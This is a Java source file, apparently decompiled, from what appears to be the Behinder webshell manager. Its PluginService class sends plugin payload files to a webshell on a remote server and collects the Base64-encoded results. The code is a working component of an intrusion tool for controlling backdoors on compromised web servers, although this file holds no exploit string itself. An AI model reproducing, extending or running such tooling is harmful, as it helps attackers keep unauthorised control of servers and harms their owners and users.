package net.rebeyond.behinder.service;

import java.util.Base64;
import java.util.List;
import java.util.Map;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.FutureTask;
import javafx.application.Platform;
import net.rebeyond.behinder.core.IShellService;
import net.rebeyond.behinder.service.callback.IPluginCallBack;
import net.rebeyond.behinder.utils.Utils;
import org.json.JSONObject;

public class PluginService {
   private IShellService currentShellService;
   private String PluginBasePath = "./Plugins/";
   private JSONObject shellEntity;
   private List workList;

   public PluginService(IShellService shellService, JSONObject shellEntity, List workList) {
      this.currentShellService = shellService;
      this.shellEntity = shellEntity;
      this.workList = workList;
   }

   public void sendTask(String pluginName, String paramStr, IPluginCallBack callBack) throws Exception {
      String type = this.shellEntity.getString("type");
      String payloadPath = this.getPayloadPath(pluginName, type);
      JSONObject paramObj = new JSONObject(paramStr);
      Map params = Utils.jsonToMap(paramObj);
      params.put("taskID", pluginName);
      Runnable runner = () -> {
         try {
            JSONObject resultObj;
            if (type.equals("php")) {
               (new Thread(() -> {
                  try {
                     this.currentShellService.submitPluginTask(pluginName, payloadPath, params);
                  } catch (Exception var5) {
                     var5.printStackTrace();
                  }

               })).start();
               Thread.sleep(2000L);
               resultObj = new JSONObject();
               resultObj.put("status", "success");
               resultObj.put("msg", "ok");
            } else {
               resultObj = this.currentShellService.submitPluginTask(pluginName, payloadPath, params);
            }

            String status = resultObj.getString("status");
            String msg = resultObj.getString("msg");
            if (status.equals("success")) {
               callBack.onSuccess(status, msg);
            } else {
               callBack.onFail(msg);
            }
         } catch (Exception var9) {
            var9.printStackTrace();
            callBack.onFail(var9.getMessage());
         }

      };
      Thread workThrad = new Thread(runner);
      this.workList.add(workThrad);
      workThrad.start();
   }

   private String getPayloadPath(String pluginName, String type) {
      if (type.equals("jsp")) {
         type = "java";
      }

      String payloadPath = String.format(this.PluginBasePath + "/%s/payload/payload.%s", pluginName, type);
      return payloadPath;
   }

   public void execTask(String pluginName, String paramStr, IPluginCallBack callBack) throws Exception {
      String type = this.shellEntity.getString("type");
      String payloadPath = this.getPayloadPath(pluginName, type);
      JSONObject paramObj = new JSONObject(paramStr);
      Map params = Utils.jsonToMap(paramObj);
      params.put("taskID", pluginName);
      Runnable runner = () -> {
         try {
            JSONObject resultObj = this.currentShellService.execPluginTask(pluginName, payloadPath, params);
            String status = resultObj.getString("status");
            String msg = resultObj.getString("msg");
            if (!status.equals("success")) {
               callBack.onFail(msg);
               throw new Exception(msg);
            }

            callBack.onSuccess(status, msg);
         } catch (Exception var8) {
            var8.printStackTrace();
            callBack.onFail(var8.getMessage());
         }

      };
      Thread workThrad = new Thread(runner);
      this.workList.add(workThrad);
      workThrad.start();
   }

   public JSONObject execTask(String pluginName, String paramStr) throws Exception {
      String type = this.shellEntity.getString("type");
      String payloadPath = this.getPayloadPath(pluginName, type);
      JSONObject paramObj = new JSONObject(paramStr);
      Map params = Utils.jsonToMap(paramObj);
      params.put("taskID", pluginName);
      return this.currentShellService.execPluginTask(pluginName, payloadPath, params);
   }

   public JSONObject getTaskResultSync(String pluginName) throws ExecutionException, InterruptedException {
      Callable runner = () -> {
         JSONObject resultObj = null;

         try {
            resultObj = this.currentShellService.getPluginTaskResult(pluginName);
            String msg = resultObj.getString("msg");
            JSONObject msgObj = new JSONObject(msg);
            String pluginResult = new String(Base64.getDecoder().decode(msgObj.getString("result")), "UTF-8");
            String pluginRunning = new String(Base64.getDecoder().decode(msgObj.getString("running")), "UTF-8");
            msgObj.put("result", pluginResult);
            msgObj.put("running", pluginRunning);
            resultObj.put("msg", msgObj);
            return resultObj;
         } catch (Exception var7) {
            var7.printStackTrace();
            resultObj.put("status", "fail");
            resultObj.put("status", var7.getMessage());
            return resultObj;
         }
      };
      FutureTask futureTask = new FutureTask(runner);
      Thread workThrad = new Thread(futureTask);
      this.workList.add(workThrad);
      workThrad.start();
      return (JSONObject)futureTask.get();
   }

   public void getTaskResult(String pluginName, IPluginCallBack callBack) {
      Runnable runner = () -> {
         try {
            JSONObject resultObj = this.currentShellService.getPluginTaskResult(pluginName);
            String status = resultObj.getString("status");
            String msg = resultObj.getString("msg");
            JSONObject msgObj = new JSONObject(msg);
            new String(Base64.getDecoder().decode(msgObj.getString("result")), "UTF-8");
            new String(Base64.getDecoder().decode(msgObj.getString("running")), "UTF-8");
            Platform.runLater(() -> {
               if (status.equals("success")) {
                  callBack.onSuccess(status, msg);
               } else {
                  callBack.onFail(msg);
               }

            });
         } catch (Exception var9) {
            callBack.onFail(var9.getMessage());
         }

      };
      Thread workThrad = new Thread(runner);
      this.workList.add(workThrad);
      workThrad.start();
   }

   public JSONObject stopTask(String pluginName) throws Exception {
      JSONObject result = this.currentShellService.stopPluginTask(pluginName);
      return result;
   }
}
